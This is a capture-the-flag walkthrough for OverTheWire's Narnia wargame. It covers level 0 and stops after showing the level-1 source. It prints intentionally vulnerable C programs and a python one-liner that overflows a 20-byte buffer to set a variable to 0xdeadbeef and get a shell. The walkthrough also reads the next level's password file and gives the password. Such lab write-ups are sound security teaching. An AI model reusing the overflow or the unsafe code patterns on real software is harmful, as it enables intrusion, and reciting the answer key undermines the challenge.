**>> Details: [https://overthewire.org/wargames/narnia/](https://overthewire.org/wargames/narnia/)**

> This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.

![grafik](https://user-images.githubusercontent.com/84674087/142839640-d5296859-5d88-4d7e-8d83-a703d855b394.png)

<br />
<br />

## Narnia 0

![grafik](https://user-images.githubusercontent.com/84674087/142839936-9a2f374f-9862-45a3-831b-77ca618ca65a.png)

#### Solution
- We check the **sourcecode of narnia0.c**
```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
- One can immediately spot the limited char buffer, which is assigned to 20 chars
- Moreover, the user input can account for up to 24 chars and is handed over to char buffer
- Let us provide user input with 24 chars to check what's happening
- To do so, we run a one-liner in the terminal with the help of simple python code
   - Option 1): ``` ./script `python -c "print('hello')"` ```
   - Option 2): `python -c "print('hello')" | ./script`
   - Option 3): `(python -c command1 ; command2 ; cat) | ./script`  --> "cat" keeps shell open (!)
- We proceed with Option 2) and adjust the command to our needs
- `python -c "print('C'*24)" | ./narnia0`
- Output:

![grafik](https://user-images.githubusercontent.com/84674087/142843934-579dcfca-d8dc-4fc9-8213-d7673334469e.png)

- We can change val from 0x41414141 (AAAA) to 0x43434343 (CCCC)
- Now we want to write "0xdeadbeef" instead of 0x43434343
- `python -c "print('C'*20 + '\xef\xbe\xad\xde')" | ./narnia0`
- It works ! But we don't see the shell ?!
- Here comes above mentioned Option 3) into the game: We have to keep the shell open with another command like "cat"
- `(python -c "print('C'*20 + '\xef\xbe\xad\xde')"; cat) | ./narnia0`
- We become user narnia1 and do `cat /etc/narnia_pass/narnia1`
- **PASSWORD:** efeidiedae

<br />

## Narnia 1

![grafik](https://user-images.githubusercontent.com/84674087/142846849-81325393-f307-4a49-be4c-4455620f6bec.png)

#### Solution 
- We check the **sourcode of narnia1.c**:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```



<br />


